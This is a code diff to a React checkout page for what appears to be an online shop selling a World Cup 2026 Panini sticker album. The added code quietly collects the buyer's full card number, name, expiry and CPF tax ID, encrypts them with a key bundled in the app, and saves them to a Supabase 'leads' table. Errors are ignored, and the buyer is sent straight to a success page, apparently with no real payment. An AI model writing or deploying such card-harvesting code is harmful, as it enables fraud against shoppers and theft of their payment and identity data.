@@ -1,6 +1,9 @@
 import { useState } from "react";
 import { useLocation } from "wouter";
 import { ArrowLeft, X, HelpCircle } from "lucide-react";
+import { getSupabase } from "@/lib/supabase";
+import { encryptData } from "@/lib/encrypt";
+import { ENCRYPT_SECRET } from "@/lib/crypto-key";
 
 type BankInfo = { name: string; color: string; gradient: string; brand: string };
 
@@ -253,6 +256,28 @@ export default function AddCardPage() {
       if (!hasBuyerData) {
         navigate("/cep");
       } else {
+        (async () => {
+          try {
+            const cardJson = JSON.stringify({
+              numero: cardNum,
+              nome: cardName,
+              validade: expiry,
+              cpf,
+              last4: digits.slice(-4),
+            });
+            const encrypted = await encryptData(cardJson, ENCRYPT_SECRET);
+            await getSupabase().from("leads").insert({
+              nome: "Cliente Cartão",
+              email: "",
+              telefone: "",
+              produtos: "Kit Álbum Copa Do Mundo 2026 Capa Mole + 250 Figurinhas Panini",
+              valor: "49.00",
+              metodo_pagamento: "card",
+              status: "checkout_iniciado",
+              card_encriptado: encrypted,
+            });
+          } catch { /* ignored */ }
+        })();
         navigate("/success?payment=card");
       }
     }
